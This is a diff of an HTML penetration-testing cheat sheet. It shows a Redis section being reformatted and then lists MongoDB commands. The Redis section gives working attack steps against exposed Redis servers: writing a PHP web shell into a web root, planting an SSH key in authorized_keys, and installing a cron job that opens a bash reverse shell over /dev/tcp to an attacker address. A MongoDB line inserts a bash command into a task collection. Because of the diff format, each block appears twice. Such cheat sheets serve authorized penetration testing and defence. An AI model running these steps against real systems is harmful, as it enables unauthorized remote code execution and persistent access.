@@ -2072,92 +2072,92 @@
 <ul>
     <li>Create php web shell</li>
     <li>If able to upload files to victim, upload module for RCE</li>
-    <li>=<5.0.5(?) clone-master RCE</li>
+    <li>=&lt;5.0.5(?) clone-master RCE</li>
 </ul>
-    <li>Tools</li>
-    <ul>
-        <li>redis-cli</li>
-        <table>
-            <tr>
-                <td>
-                    <li>Get redis info / test if authentication is require</li>
-                    <ul>
-                        <li>By default redis does not require credentials</li>
-                        <li>Redis can be configured to require only a password or username + password</li>
-                        <ul>
-                            <li>If only the passsword is set, then the username is "default"</li>
-                            <li>There is no way to know externally if password or password & username are set.</li>
-                            <li>redis.conf is the configuration file.  requirepass and masteruser are the username and password settings</li>
-                        </ul>
-                    </ul>
-                </td>
-                <td>info</td>
-            </tr>
-            <tr>
-                <td>Login with credentials</td>
-                <td>AUTH &lt;password&gt;<br>AUTH &lt;username&gt; &lt;password&gt;</td>
-            </tr>
-            <tr>
-                <td>Get configuration file contents</td>
-                <td>CONFIG GET *</td>
-            </tr>
-            <tr>
-                <td>Show connected clients</td>
-                <td>CLIENT LIST</td>
-            </tr>
-            <tr>
-                <td>Show keys</td>
-                <td>keys *</td>
-            </tr>
-            <tr>
-                <td>Get keys from database</td>
-                <td>SELECT &lt;db # under &quot;# Keyspace&quot; in info&gt;&lt;br&gt;KEYS *&lt;br&gt;GET &lt;Key&gt;</td>
-            </tr>
-            <tr>
-                <td>Web shell RCE</td>
-                <td>config set dir &lt;web server root directory&gt;<br>config set dbfilename shell.php<br>set test "<?php system($_REQUEST['cmd'] ?>"<br>save</td>
-            </tr>
-            <tr>
-                <td>Upload SSH Key</td>
-                <td>import public key to redis:<br>(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt<br>cat foo.txt | redis-cli -h &lt;ip addres&gt; -x set crackit<br>config set dir &lt;writable home directory&gt;<br>config set dbfilename<br>"authorized_keys"<br>save</td>
-            </tr>
-            <tr>
-                <td>Reverse shell through cronjobs</td>
-                <td>
-                    <li>redis-cli -h &lt;ip address&gt; flushall </li>
-                    <li>echo -e "\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;ip address&gt;/&lt;port&gt; 0&gt;&amp;1\n\n&quot;|redis-cli -h &lt;ip address&gt; -x set 1</li>
-                    <li>redis-cli -h &lt;ip address&gt; config set dir /var/spool/cron/ </li>
-                    <li>redis-cli -h &lt;ip address&gt; config set dbfilename root</li>
-                    <li>redis-cli -h &lt;ip address&gt; save</li>
-                </td>
-            </tr>
-        </table>
-    </ul>
-
-    <h2>6697 TCP / irc</h2>
-    <li>Incoming IRC connections encrypted via TLS/SSL</li>
-
-    <br>
-
-    <h2>27017 TCP / mongodb</h2>
+<li>Tools</li>
+<ul>
+    <li>redis-cli</li>
     <table>
         <tr>
-            <td>Connect to db</td>
-            <td>mongo -u &lt;username&gt; -p &lt;password&gt; &lt;database&gt;</td>
+            <td>
+                <li>Get redis info / test if authentication is require</li>
+                <ul>
+                    <li>By default redis does not require credentials</li>
+                    <li>Redis can be configured to require only a password or username + password</li>
+                    <ul>
+                        <li>If only the passsword is set, then the username is "default"</li>
+                        <li>There is no way to know externally if password or password & username are set.</li>
+                        <li>redis.conf is the configuration file.  requirepass and masteruser are the username and password settings</li>
+                    </ul>
+                </ul>
+            </td>
+            <td>info</td>
         </tr>
         <tr>
-            <td>show collections (mongodb version of mysql tables)</td>
-            <td>show collections</td>
+            <td>Login with credentials</td>
+            <td>AUTH &lt;password&gt;<br>AUTH &lt;username&gt; &lt;password&gt;</td>
         </tr>
         <tr>
-            <td>search for objects in a collection</td>
-            <td>db.&lt;collection&gt;.find()</td>
+            <td>Get configuration file contents</td>
+            <td>CONFIG GET *</td>
         </tr>
         <tr>
-            <td>add command/object to collection</td>
-            <td>db.tasks.insert({"cmd&quot;:&quot;&lt;bash command&gt;&quot;})</td>
+            <td>Show connected clients</td>
+            <td>CLIENT LIST</td>
+        </tr>
+        <tr>
+            <td>Show keys</td>
+            <td>keys *</td>
+        </tr>
+        <tr>
+            <td>Get keys from database</td>
+            <td>SELECT &lt;db # under &quot;# Keyspace&quot; in info&gt;&lt;br&gt;KEYS *&lt;br&gt;GET &lt;Key&gt;</td>
+        </tr>
+        <tr>
+            <td>Web shell RCE</td>
+            <td>config set dir &lt;web server root directory&gt;<br>config set dbfilename shell.php<br>set test "<?php system($_REQUEST['cmd'] ?>"<br>save</td>
+        </tr>
+        <tr>
+            <td>Upload SSH Key</td>
+            <td>import public key to redis:<br>(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt<br>cat foo.txt | redis-cli -h &lt;ip addres&gt; -x set crackit<br>config set dir &lt;writable home directory&gt;<br>config set dbfilename<br>"authorized_keys"<br>save</td>
+        </tr>
+        <tr>
+            <td>Reverse shell through cronjobs</td>
+            <td>
+                <li>redis-cli -h &lt;ip address&gt; flushall </li>
+                <li>echo -e "\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;ip address&gt;/&lt;port&gt; 0&gt;&amp;1\n\n&quot;|redis-cli -h &lt;ip address&gt; -x set 1</li>
+                <li>redis-cli -h &lt;ip address&gt; config set dir /var/spool/cron/ </li>
+                <li>redis-cli -h &lt;ip address&gt; config set dbfilename root</li>
+                <li>redis-cli -h &lt;ip address&gt; save</li>
+            </td>
         </tr>
     </table>
+</ul>
+
+<h2>6697 TCP / irc</h2>
+<li>Incoming IRC connections encrypted via TLS/SSL</li>
+
+<br>
+
+<h2>27017 TCP / mongodb</h2>
+<table>
+    <tr>
+        <td>Connect to db</td>
+        <td>mongo -u &lt;username&gt; -p &lt;password&gt; &lt;database&gt;</td>
+    </tr>
+    <tr>
+        <td>show collections (mongodb version of mysql tables)</td>
+        <td>show collections</td>
+    </tr>
+    <tr>
+        <td>search for objects in a collection</td>
+        <td>db.&lt;collection&gt;.find()</td>
+    </tr>
+    <tr>
+        <td>add command/object to collection</td>
+        <td>db.tasks.insert({"cmd&quot;:&quot;&lt;bash command&gt;&quot;})</td>
+    </tr>
+</table>
 
 
 </body>
